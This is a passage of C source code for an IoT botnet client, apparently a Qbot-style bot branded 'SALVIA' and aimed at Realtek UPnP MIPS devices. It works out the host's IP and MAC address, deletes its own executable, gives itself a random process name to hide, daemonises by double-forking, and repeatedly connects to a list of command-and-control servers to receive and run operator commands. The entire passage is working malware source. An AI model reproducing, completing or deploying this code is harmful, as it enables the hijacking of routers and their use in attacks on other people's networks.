	int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
	if(err == -1) return 0;
	struct sockaddr_in name;
	socklen_t namelen = sizeof(name);
	err = getsockname(sock, (struct sockaddr*) &name, &namelen);
	if(err == -1) return 0;
	ourIP.s_addr = name.sin_addr.s_addr;
	int cmdline = open("/proc/net/route", O_RDONLY);
	char linebuf[4096];
	while(fdgets(linebuf, 4096, cmdline) != NULL) {
		if(strstr(linebuf, "\t00000000\t") != NULL) {
			unsigned char *pos = linebuf;
			while(*pos != '\t') pos++;
			*pos = 0;
			break;
		}
		memset(linebuf, 0, 4096);
	}
	close(cmdline);
	if(*linebuf) {
		int i;
		struct ifreq ifr;
		strcpy(ifr.ifr_name, linebuf);
		ioctl(sock, SIOCGIFHWADDR, &ifr);
		for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
	}
	close(sock);
}
int initConnection() {
	unsigned char server[4096];
	memset(server, 0, 4096);
	if(KittyCommSock) { close(KittyCommSock); KittyCommSock = 0; } 
	if(botnetServer + 1 == SERVER_LIST_SIZE) botnetServer = 0;
	else botnetServer++;
	strcpy(server, botnetNet[botnetServer]);
	int port = Server_Botport;
	if(strchr(server, ':') != NULL) {
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	KittyCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(KittyCommSock, server, port, 30)) return 1;
	return 0;
}
char *getBuild() {
	#if defined(_mips__mips) || defined(__mips) || defined(__MIPS_) || defined(_mips)
	return "Type: Realtek UPNP";
	#else
	return "Type: Unknown";
	#endif
}
int main(int argc, unsigned char *argv[]) {
	char name_buf[32];
	char id_buf[32];
	int name_buf_len;
	if(SERVER_LIST_SIZE <= 0) return 0; 
	unlink(argv[0]);
	rand_init();
	name_buf_len = ((rand_next() % 4) + 3) * 4;
	rand_alphastr(name_buf, name_buf_len);
	name_buf[name_buf_len] = 0;
	util_strcpy(argv[0], name_buf);
	name_buf_len = ((rand_next() % 6) + 3) * 4;
	rand_alphastr(name_buf, name_buf_len);
	name_buf[name_buf_len] = 0;
	prctl(PR_SET_NAME, name_buf);
	srand(time(NULL) ^ getpid());
	rand_init();
	pid_t pid1;
	pid_t pid2;
	int status;
	getOurIP();
	if (pid1 = fork()) {
		waitpid(pid1, &status, 0);
		exit(0);
	} else if (!pid1) {
		if (pid2 = fork()) {
			exit(0);
		} else if (!pid2) {
		} else {
		}
	} else {
	} 
	chdir("/");
	signal(SIGPIPE, SIG_IGN);
	while(1) {
		if(initConnection()) { continue; }
		botnetPrint(KittyCommSock, "\x1b[0m[\x1b[35;1mSALVIA\x1b[0m] \x1b[36;1mCONNECTED \x1b[0m[\x1b[32;1m%s\x1b[0m:\x1b[0;32m%s\x1b[0m]\x1b[0m", inet_ntoa(ourIP), getBuild());
		char commBuf[4096];
		int got = 0;
		int i = 0;
		while((got = recvLine(KittyCommSock, commBuf, 4096)) != -1) {
			for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
				unsigned int *newpids, on;
				for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
				pids[on - 1] = 0;
				numpids--;
				newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
				for (on = 0; on < numpids; on++) newpids[on] = pids[on];
				free(pids);
				pids = newpids;
			}
			commBuf[got] = 0x00;
			trim(commBuf);
			unsigned char *message = commBuf;
			if(*message == '!') {
				unsigned char *nickMask = message + 1;
				while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
				if(*nickMask == 0x00) continue;
				*(nickMask) = 0x00;
				nickMask = message + 1;
				message = message + strlen(nickMask) + 2;
				while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
				unsigned char *command = message;
				while(*message != ' ' && *message != 0x00) message++;
				*message = 0x00;
				message++;
				unsigned char *tmpcommand = command;
				while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
				unsigned char *params[10];
				int paramsCount = 1;
				unsigned char *pch = strtok(message, " ");
				params[0] = command;
				while(pch) {
					if(*pch != '\n') {
						params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
						memset(params[paramsCount], 0, strlen(pch) + 1);
						strcpy(params[paramsCount], pch);
						paramsCount++;
					}
					pch = strtok(NULL, " ");
				}
				processCmd(paramsCount, params);
				if(paramsCount > 1) {
					int q = 1;
					for(q = 1; q < paramsCount; q++) {
						free(params[q]);
					}
				}
			}
		}
	}
	return 0;
}
